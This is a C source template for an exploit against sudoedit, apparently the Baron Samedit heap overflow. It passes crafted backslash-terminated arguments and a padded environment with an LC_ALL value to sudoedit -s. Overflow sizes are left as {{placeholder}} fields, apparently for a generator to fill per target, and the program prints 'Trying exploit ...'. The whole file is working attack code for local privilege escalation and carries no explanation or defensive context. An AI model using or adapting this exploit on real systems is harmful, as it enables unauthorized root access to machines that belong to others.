#include <stdio.h>
int main(int argc, char *argv[])
{
	char *s_argv[]={
        "/usr/bin/sudoedit", "-s", "{{smash_a}}\\", "\\", "{{smash_b}}\\", NULL
    };


    char *s_envp[{{full_len}}];

    int envp_pos = 0;


    for(int i = 0; i < {{null_stomp_len}}; i++) {
        s_envp[envp_pos++] = "\\";
    }

    s_envp[envp_pos++] = "0/xd0ff999999";
    s_envp[envp_pos++] = "LC_ALL=C.UTF-8@{{lc_all}}";
    s_envp[envp_pos++] = NULL;

    printf("Trying exploit ...");
	execve("/usr/bin/sudoedit", s_argv, s_envp);
}